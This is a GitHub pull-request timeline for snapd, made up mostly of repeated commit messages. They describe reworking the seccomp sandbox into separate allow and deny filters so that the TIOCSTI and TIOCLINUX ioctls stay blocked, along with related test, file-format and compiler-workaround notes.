For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

[1] https://github.com/snapcore/snapd/pull/12849#discussion_r1206855700")`
‚Ä¶

`[8b106ad](/mvo5/snappy/commit/8b106ad2bf7963c364a8608aae0e302ea5cd87ce)`

```
When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because of the way libseccomp is working.

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

[1] [canonical#12849 (comment)](https://github.com/canonical/snapd/pull/12849#discussion_r1206855700)
```

[mvo5](/mvo5)
added a commit
to mvo5/snappy
that referenced
this pull request
[Jul 10, 2023](#ref-commit-714331f)
[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)

`[snap-{seccomp,confine}: rework seccomp denylist](/mvo5/snappy/commit/714331f0df8ec1dc83010f4922ecfe768dd6ace6 "snap-{seccomp,confine}: rework seccomp denylist

When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

[1] https://github.com/snapcore/snapd/pull/12849#discussion_r1206855700
[2] https://github.com/seccomp/libseccomp/issues/44")`
‚Ä¶

`[714331f](/mvo5/snappy/commit/714331f0df8ec1dc83010f4922ecfe768dd6ace6)`

```
When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

[1] [canonical#12849 (comment)](https://github.com/canonical/snapd/pull/12849#discussion_r1206855700)
[2] [seccomp/libseccomp#44](https://github.com/seccomp/libseccomp/issues/44)
```

[mvo5](/mvo5)
added a commit
to mvo5/snappy
that referenced
this pull request
[Jul 10, 2023](#ref-commit-de66c12)
[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)

`[snap-{seccomp,confine}: rework seccomp denylist](/mvo5/snappy/commit/de66c12ab9fc435b38e6651e9f1a57eeb9dc87a5 "snap-{seccomp,confine}: rework seccomp denylist

When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

[1] https://github.com/snapcore/snapd/pull/12849#discussion_r1206855700
[2] https://github.com/seccomp/libseccomp/issues/44")`
‚Ä¶

`[de66c12](/mvo5/snappy/commit/de66c12ab9fc435b38e6651e9f1a57eeb9dc87a5)`

```
When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

[1] [canonical#12849 (comment)](https://github.com/canonical/snapd/pull/12849#discussion_r1206855700)
[2] [seccomp/libseccomp#44](https://github.com/seccomp/libseccomp/issues/44)
```

[mvo5](/mvo5)
added a commit
to mvo5/snappy
that referenced
this pull request
[Jul 10, 2023](#ref-commit-04f9677)
[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)

`[snap-{seccomp,confine}: rework seccomp denylist](/mvo5/snappy/commit/04f967735c261206e27a1d5d267131a1fddfe242 "snap-{seccomp,confine}: rework seccomp denylist

When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

[1] https://github.com/snapcore/snapd/pull/12849#discussion_r1206855700
[2] https://github.com/seccomp/libseccomp/issues/44")`
‚Ä¶

`[04f9677](/mvo5/snappy/commit/04f967735c261206e27a1d5d267131a1fddfe242)`

```
When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

[1] [canonical#12849 (comment)](https://github.com/canonical/snapd/pull/12849#discussion_r1206855700)
[2] [seccomp/libseccomp#44](https://github.com/seccomp/libseccomp/issues/44)
```

[mvo5](/mvo5)
added a commit
to mvo5/snappy
that referenced
this pull request
[Jul 10, 2023](#ref-commit-07b142c)
[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)

`[snap-{seccomp,confine}: rework seccomp denylist](/mvo5/snappy/commit/07b142c8aed32e71c634fabbea67f107ecbe5440 "snap-{seccomp,confine}: rework seccomp denylist

When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

[1] https://github.com/snapcore/snapd/pull/12849#discussion_r1206855700
[2] https://github.com/seccomp/libseccomp/issues/44")`
‚Ä¶

`[07b142c](/mvo5/snappy/commit/07b142c8aed32e71c634fabbea67f107ecbe5440)`

```
When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

[1] [canonical#12849 (comment)](https://github.com/canonical/snapd/pull/12849#discussion_r1206855700)
[2] [seccomp/libseccomp#44](https://github.com/seccomp/libseccomp/issues/44)
```

[mvo5](/mvo5)
added a commit
to mvo5/snappy
that referenced
this pull request
[Jul 10, 2023](#ref-commit-d07e460)
[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)

`[snap-{seccomp,confine}: rework seccomp denylist](/mvo5/snappy/commit/d07e46090186d04365229e85a31cb959260e7f76 "snap-{seccomp,confine}: rework seccomp denylist

When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

[1] https://github.com/snapcore/snapd/pull/12849#discussion_r1206855700
[2] https://github.com/seccomp/libseccomp/issues/44")`
‚Ä¶

`[d07e460](/mvo5/snappy/commit/d07e46090186d04365229e85a31cb959260e7f76)`

```
When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

[1] [canonical#12849 (comment)](https://github.com/canonical/snapd/pull/12849#discussion_r1206855700)
[2] [seccomp/libseccomp#44](https://github.com/seccomp/libseccomp/issues/44)
```

[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)
[mvo5](/mvo5)
mentioned this pull request
[Jul 10, 2023](#ref-pullrequest-1797318689)

[snap-{seccomp,confine}: rework seccomp denylist
#12971](/canonical/snapd/pull/12971)
 Closed

[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)
[mvo5](/mvo5)
mentioned this pull request
[Jul 21, 2023](#ref-pullrequest-1816025998)

[snap-{seccomp,confine}: rework seccomp denylist
#13014](/canonical/snapd/pull/13014)
 Closed

[mvo5](/mvo5)
added a commit
to mvo5/snappy
that referenced
this pull request
[Jul 28, 2023](#ref-commit-6f78b3d)
[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)

`[snap-{seccomp,confine}: rework seccomp denylist](/mvo5/snappy/commit/6f78b3deb4345208a85598b42251ef667c3662a6 "snap-{seccomp,confine}: rework seccomp denylist

When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

The file format of the `snap.snap.app.bin` changes to `.bin2`
and includes a proper header that would allow us to extend more
easily in the future.

The exiting tests for negative filtering got also updated so that
the deny/allow is tested via different errno numbers to ensure that
the expected filter denies the access.

The `snap-seccomp` spread test now also runs on all ubuntu releases.

This work will also allow us to remove the `global.bin` seccomp
filter in a followup PR.

[1] https://github.com/snapcore/snapd/pull/12849#discussion_r1206855700
[2] https://github.com/seccomp/libseccomp/issues/44")`
‚Ä¶

`[6f78b3d](/mvo5/snappy/commit/6f78b3deb4345208a85598b42251ef667c3662a6)`

```
When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

The file format of the `snap.snap.app.bin` changes to `.bin2`
and includes a proper header that would allow us to extend more
easily in the future.

The exiting tests for negative filtering got also updated so that
the deny/allow is tested via different errno numbers to ensure that
the expected filter denies the access.

The `snap-seccomp` spread test now also runs on all ubuntu releases.

This work will also allow us to remove the `global.bin` seccomp
filter in a followup PR.

[1] [canonical#12849 (comment)](https://github.com/canonical/snapd/pull/12849#discussion_r1206855700)
[2] [seccomp/libseccomp#44](https://github.com/seccomp/libseccomp/issues/44)
```

[mvo5](/mvo5)
added a commit
to mvo5/snappy
that referenced
this pull request
[Jul 31, 2023](#ref-commit-53aa5ac)
[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)

`[snap-{seccomp,confine}: rework seccomp denylist](/mvo5/snappy/commit/53aa5acce4ec5e5fe1810d7d8e44cdff1ecc4981 "snap-{seccomp,confine}: rework seccomp denylist

When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

The file format of the `snap.snap.app.bin` changes to `.bin2`
and includes a proper header that would allow us to extend more
easily in the future.

The exiting tests for negative filtering got also updated so that
the deny/allow is tested via different errno numbers to ensure that
the expected filter denies the access.

The `snap-seccomp` spread test now also runs on all ubuntu releases.

This work will also allow us to remove the `global.bin` seccomp
filter in a followup PR.

[1] https://github.com/snapcore/snapd/pull/12849#discussion_r1206855700
[2] https://github.com/seccomp/libseccomp/issues/44")`
‚Ä¶

`[53aa5ac](/mvo5/snappy/commit/53aa5acce4ec5e5fe1810d7d8e44cdff1ecc4981)`

```
When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

The file format of the `snap.snap.app.bin` changes to `.bin2`
and includes a proper header that would allow us to extend more
easily in the future.

The exiting tests for negative filtering got also updated so that
the deny/allow is tested via different errno numbers to ensure that
the expected filter denies the access.

The `snap-seccomp` spread test now also runs on all ubuntu releases.

This work will also allow us to remove the `global.bin` seccomp
filter in a followup PR.

[1] [canonical#12849 (comment)](https://github.com/canonical/snapd/pull/12849#discussion_r1206855700)
[2] [seccomp/libseccomp#44](https://github.com/seccomp/libseccomp/issues/44)
```

[mvo5](/mvo5)
added a commit
to mvo5/snappy
that referenced
this pull request
[Jul 31, 2023](#ref-commit-2f66402)
[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)

`[snap-{seccomp,confine}: rework seccomp denylist](/mvo5/snappy/commit/2f6640284e46fed23cbe4e9f9df9c04764e62cd4 "snap-{seccomp,confine}: rework seccomp denylist

When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

The file format of the `snap.snap.app.bin` changes to `.bin2`
and includes a proper header that would allow us to extend more
easily in the future.

The exiting tests for negative filtering got also updated so that
the deny/allow is tested via different errno numbers to ensure that
the expected filter denies the access.

The `snap-seccomp` spread test now also runs on all ubuntu releases.

This work will also allow us to remove the `global.bin` seccomp
filter in a followup PR.

[1] https://github.com/snapcore/snapd/pull/12849#discussion_r1206855700
[2] https://github.com/seccomp/libseccomp/issues/44")`
‚Ä¶

`[2f66402](/mvo5/snappy/commit/2f6640284e46fed23cbe4e9f9df9c04764e62cd4)`

```
When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

The file format of the `snap.snap.app.bin` changes to `.bin2`
and includes a proper header that would allow us to extend more
easily in the future.

The exiting tests for negative filtering got also updated so that
the deny/allow is tested via different errno numbers to ensure that
the expected filter denies the access.

The `snap-seccomp` spread test now also runs on all ubuntu releases.

This work will also allow us to remove the `global.bin` seccomp
filter in a followup PR.

[1] [canonical#12849 (comment)](https://github.com/canonical/snapd/pull/12849#discussion_r1206855700)
[2] [seccomp/libseccomp#44](https://github.com/seccomp/libseccomp/issues/44)
```

[mvo5](/mvo5)
added a commit
to mvo5/snappy
that referenced
this pull request
[Jul 31, 2023](#ref-commit-c584cb0)
[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5)

`[snap-{seccomp,confine}: rework seccomp denylist](/mvo5/snappy/commit/c584cb0475fb6d1f5a5285f62706cba7bbb168ef "snap-{seccomp,confine}: rework seccomp denylist

When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

The file format of the `snap.snap.app.bin` changes to `.bin2`
and includes a proper header that would allow us to extend more
easily in the future.

The exiting tests for negative filtering got also updated so that
the deny/allow is tested via different errno numbers to ensure that
the expected filter denies the access.

The `snap-seccomp` spread test now also runs on all ubuntu releases.

This work will also allow us to remove the `global.bin` seccomp
filter in a followup PR.

[1] https://github.com/snapcore/snapd/pull/12849#discussion_r1206855700
[2] https://github.com/seccomp/libseccomp/issues/44")`
‚Ä¶

`[c584cb0](/mvo5/snappy/commit/c584cb0475fb6d1f5a5285f62706cba7bbb168ef)`

```
When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

The file format of the `snap.snap.app.bin` changes to `.bin2`
and includes a proper header that would allow us to extend more
easily in the future.

The exiting tests for negative filtering got also updated so that
the deny/allow is tested via different errno numbers to ensure that
the expected filter denies the access.

The `snap-seccomp` spread test now also runs on all ubuntu releases.

This work will also allow us to remove the `global.bin` seccomp
filter in a followup PR.

[1] [canonical#12849 (comment)](https://github.com/canonical/snapd/pull/12849#discussion_r1206855700)
[2] [seccomp/libseccomp#44](https://github.com/seccomp/libseccomp/issues/44)
```

[![@GoVulnBot](https://avatars.githubusercontent.com/u/96493708?s=40&v=4)](/GoVulnBot)
[GoVulnBot](/GoVulnBot)
mentioned this pull request
[Sep 1, 2023](#ref-issue-1877984787)

[x/vulndb: potential Go vuln in github.com/snapcore/snapd: CVE-2023-1523
golang/vulndb#2034](/golang/vulndb/issues/2034)

Closed

[jslarraz](/jslarraz)
pushed a commit
to jslarraz/snapd
that referenced
this pull request
[Jan 2, 2024](#ref-commit-f53f9d3)
[![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5) [![@jslarraz](https://avatars.githubusercontent.com/u/14233807?s=40&v=4)](/jslarraz)

`[snap-{seccomp,confine}: rework seccomp denylist](/jslarraz/snapd/commit/f53f9d350b2c626a83689b8c78282c4903c85f5c "snap-{seccomp,confine}: rework seccomp denylist

When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

The file format of the `snap.snap.app.bin` changes to `.bin2`
and includes a proper header that would allow us to extend more
easily in the future.

The exiting tests for negative filtering got also updated so that
the deny/allow is tested via different errno numbers to ensure that
the expected filter denies the access.

The `snap-seccomp` spread test now also runs on all ubuntu releases.

This work will also allow us to remove the `global.bin` seccomp
filter in a followup PR.

[1] https://github.com/snapcore/snapd/pull/12849#discussion_r1206855700
[2] https://github.com/seccomp/libseccomp/issues/44")`
‚Ä¶

`[f53f9d3](/jslarraz/snapd/commit/f53f9d350b2c626a83689b8c78282c4903c85f5c)`

```
When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

The file format of the `snap.snap.app.bin` changes to `.bin2`
and includes a proper header that would allow us to extend more
easily in the future.

The exiting tests for negative filtering got also updated so that
the deny/allow is tested via different errno numbers to ensure that
the expected filter denies the access.

The `snap-seccomp` spread test now also runs on all ubuntu releases.

This work will also allow us to remove the `global.bin` seccomp
filter in a followup PR.

[1] [canonical#12849 (comment)](https://github.com/canonical/snapd/pull/12849#discussion_r1206855700)
[2] [seccomp/libseccomp#44](https://github.com/seccomp/libseccomp/issues/44)
```

[ernestl](/ernestl)
pushed a commit
that referenced
this pull request
[Apr 10, 2024](#ref-commit-182b8ae)
[![@jslarraz](https://avatars.githubusercontent.com/u/14233807?s=40&u=fab020a6d53afaa8f2b9dd64e78973501c182c44&v=4)](/jslarraz) [![@mvo5](https://avatars.githubusercontent.com/u/914418?s=40&u=318cd606eee682cf30cc65dac148efc24ca3d1a7&v=4)](/mvo5) [![@bboozzoo](https://avatars.githubusercontent.com/u/41870?s=40&u=a5a8ff5a5b9e5766cde26fab1fedb5d70b9c29ad&v=4)](/bboozzoo)

`[snap-seccomp, snap-confine, i/seccomp, tests: rework seccomp denylist (](/canonical/snapd/commit/182b8ae699e39bd3707cec80777f58e5baed34c6 "snap-seccomp, snap-confine, i/seccomp, tests: rework seccomp denylist (#13443)

* snap-{seccomp,confine}: rework seccomp denylist

When a denylist was introduced in PR#12849 we reached the limits
of the API of libseccomp and some things are now hard to reason
about [1]. This is mostly because what we try to do does not
match the libseccomp API very well and a slightly different
approach is probably more aligned with it's design (see also
this libseccomp issue [2] that is related to our issue).

So this commit changes the approach and instead of trying to use
a single filter the work is split into two filters:
1. explicit allow list
2. explicit deny list

and then load both filters into the kernel. The way the kernel
works is that it selects the most restrictive action.

So in the case of PR#12849:
```
~ioctl - TIOCSTI
~ioctl - TIOCLINUX
ioctl
```
For `ioctl(TIOCLINUX)` the first allow filter would pass `ioctl`
but the second deny filter would correctly deny the TIOCLINUX.

The file format of the `snap.snap.app.bin` changes to `.bin2`
and includes a proper header that would allow us to extend more
easily in the future.

The exiting tests for negative filtering got also updated so that
the deny/allow is tested via different errno numbers to ensure that
the expected filter denies the access.

The `snap-seccomp` spread test now also runs on all ubuntu releases.

This work will also allow us to remove the `global.bin` seccomp
filter in a followup PR.

[1] https://github.com/snapcore/snapd/pull/12849#discussion_r1206855700
[2] https://github.com/seccomp/libseccomp/issues/44

* snap-confine: tweak sc_seccomp_file_header struct (thanks Philip!)

* snap-confine: tweak struct init workaround in sc_apply_seccomp_profile_for_security_tag (thanks Philip)

* snap-seccomp: remove outdated comment about big endian

* snap-confine: rename sc_must_read_header_from_file->sc_must_read_and_validate_header_from_file

* snap-seccomp: rework exportBPF() to not require a temp file

Thanks to Valentin for the suggestion. Also reverts the change to
the `install-store-laaaarge` tests because there is no need for
space in /tmp anymore.

* tests: improve messae in security-seccomp deny test

* snap-confine: rename \"struct stat buf\" -> \"struct stat stat_buf\"

* snap-confine: check that filer size if multiple of sock_filter

Thanks to Valentin for the suggestion. Also adds a bunch of
C unit tests to check that the code works correctly. Sadly
C makes it hard to write this in a concise way so there is
a bit of repetition.

* snap-confine: extract must_read_and_validate_header_from_file_dies_with() helper

* snap-confine: workaround bug in gcc from 14.04

The gcc (4.8.4) in 14.04 will not compile the following code:
```
	struct sc_seccomp_file_header hdr = {0};
```
and will error with:
```
snap-confine/seccomp-support.c: In function ‚Äòsc_apply_seccomp_profile_for_security_tag‚Äô:
snap-confine/seccomp-support.c:246:9: error: missing braces around initializer [-Werror=missing-braces]
  struct sc_seccomp_file_header hdr = {0};
         ^
snap-confine/seccomp-support.c:246:9: error: (near initialization for ‚Äòhdr.header‚Äô) [-Werror=missing-braces]
```

to workaround this a pragma is added.

* snap-confine: check filters are not empty and keep read access to global.bin file

* tests: add details field to security-profiles and snap-seccomp spread tests

* snap-confine: move empty filter validation to sc_must_read_filter_from_file to avoid conflicts with classic snaps

* snap-{seccomp,confine}: add tests for missing seccomp profile and explicit deny has precedence to to explicit allow

* snap-confine: run make fmt

* cmd/snap-confine: make fmt again with indent 2.2.13+

Signed-off-by: Maciej Borzecki <maciej.borzecki@canonical.com>

